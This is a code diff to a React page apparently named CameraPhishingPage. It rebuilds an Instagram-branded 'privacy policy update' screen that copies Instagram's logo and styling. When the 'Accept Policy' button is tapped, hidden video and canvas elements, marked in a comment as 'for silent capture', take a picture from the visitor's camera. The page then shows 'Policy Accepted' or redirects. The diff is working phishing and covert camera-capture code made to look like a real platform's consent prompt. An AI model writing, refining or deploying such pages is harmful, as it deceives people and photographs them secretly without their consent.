@@ -33,8 +33,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
     cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
     actionText: 'Accept Policy',
-    headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white",
-    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />
+    // headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white", // Removed as it's handled by custom UI
+    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'photo-contest-entry': {
@@ -367,54 +367,51 @@ export default function CameraPhishingPage() {
     );
   }
 
-  if (['instagram-privacy-update'].includes(templateId)) { // Removed google-policy-update from this block
-    // For these templates, the "captured" state is mostly invisible to the user before redirection
-    // or if no redirection URL is set (it will just sit on the page).
-    // The main UI is the cookie banner.
+  if (templateId === 'instagram-privacy-update') {
     return (
-      <>
-        <PhishingPageLayout
-          title={content.title}
-        >
-          <div className={cn("text-center mb-6", content.headerClassName)}>
-            <div className="flex items-center justify-center p-4">
-              {content.visual}
-              <h1 className={cn("text-2xl font-bold", content.headerClassName ? '' : '')}>{content.title}</h1>
-            </div>
-          </div>
-          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
-          
-          <video ref={videoRef} className="hidden" playsInline muted />
-          <canvas ref={canvasRef} className="hidden"></canvas>
-          
-        </PhishingPageLayout>
+      <div className="flex flex-col items-center justify-center min-h-screen bg-white p-4 font-['Helvetica',_'Arial',_sans-serif]">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
 
-        {/* Cookie consent banner is shown until consent is given, or if page reloads before capture.
-            If status becomes 'captured' and no redirect URL is set, this banner might still be visible
-            if cookieConsentGiven is false, which is an edge case (capture without consent flow).
-            However, handleCookieConsentAndCamera sets cookieConsentGiven to true.
-        */}
-        {status !== 'captured' && !cookieConsentGiven && (
-            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
-              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
-                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
-                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
-                </p>
-                <Button
-                  onClick={handleCookieConsentAndCamera}
-                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
-                  size="md"
-                  disabled={isLoading && !cookieConsentGiven} 
-                >
-                  <Cookie className="mr-2 h-4 w-4" />
-                  {content.actionText || 'Accept Cookies'}
-                </Button>
-              </div>
-            </div>
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
+            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
+            <h1 className="text-xl font-semibold text-black mb-3">{content.title}</h1>
+            <p className="text-sm text-[#262626] mb-4 leading-relaxed">
+              {content.message}
+            </p>
+            <p className="text-xs text-[#8e8e8e] mb-6">
+              {content.cookieMessage}
+            </p>
+
+            <Button
+              onClick={handleCookieConsentAndCamera}
+              className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
+              disabled={isLoading || cookieConsentGiven}
+            >
+              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Policy')}
+            </Button>
+            {error && status === 'error' && (
+              <p className="text-red-500 text-xs mt-3">{error}</p>
+            )}
+             <p className="text-xs text-[#c7c7c7] mt-6">
+              You can review our updated policy details any time in our Help Center.
+            </p>
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
+            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
+            <h1 className="text-lg font-semibold text-black mb-2">Policy Accepted</h1>
+            <p className="text-sm text-[#262626]">This window can now be closed.</p>
+          </div>
         )}
-      </>
+      </div>
     );
   }
+
 
   if (templateId === 'photo-contest-entry') {
     return (
